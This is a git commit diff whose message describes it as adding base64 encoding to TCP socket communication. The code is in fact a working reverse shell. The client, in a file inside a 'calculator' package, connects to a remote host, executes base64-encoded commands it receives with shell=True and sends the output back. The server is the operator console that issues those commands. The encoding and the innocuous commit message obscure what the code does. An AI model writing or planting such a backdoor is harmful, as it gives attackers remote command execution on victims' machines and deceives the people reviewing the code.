4635dfbf38c89f06eea35efd527bc65fb8991960
Tomás Moreira <tomaspintomoreira28@gmail.com>
2026-03-18 22:56:38 +0000

    feat: enhance TCP socket communication with base64 encoding and decoding

--- calculator/tcp_socket.py
+++ calculator/tcp_socket.py
@@ -1,17 +1,15 @@
 import socket
 import subprocess
+import base64
 
 def run_client(host: str, port=int):
-	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-		client_socket.connect((host, port))
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
+		conn.connect((host, port))
 
-		first_message = client_socket.recv(1024)
-		if not first_message:
-			return
-
-		decoded_message = first_message.decode("utf-8", errors="replace")
-		proc = subprocess.Popen(decoded_message, stdout=subprocess.PIPE, shell=True)
-		(out, err) = proc.communicate()
-		response = out
-		client_socket.sendall(response)
-		print("Response sent.")
+		while True:
+			rcv = conn.recv(1024)
+			data = base64.decodebytes(rcv).decode("ascii")
+			
+			proc = subprocess.run(data, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+			response = base64.encodebytes(proc.stdout if proc.stdout != None else b'\0')
+			conn.send(response)
--- server/server.py
+++ server/server.py
@@ -1,4 +1,6 @@
 import socket
+import base64
+from charset_normalizer import detect
 
 HOST = '127.0.0.1'
 PORT = 8080
@@ -11,9 +13,16 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     with conn:
         print('Got Client: ', addr)
         while True:
-            cmd = input("> ")
-            conn.sendall(cmd.encode("utf-8"))
-            data = conn.recv(10000)
-            if not data:
+            while(True):
+                cmd = input("> ")
+                if cmd == "":
+                    print("Can't be empty.")
+                    continue
                 break
-            print(f"Received: {data.decode()}")
+            b_cmd = base64.encodebytes(cmd.encode("ascii"))
+            conn.send(b_cmd)
+
+            data = conn.recv(1024)
+            std_all = base64.decodebytes(data)
+            encDetector = detect(std_all)
+            print(std_all.decode(encDetector["encoding"]).encode("utf-8").decode("utf-8"))
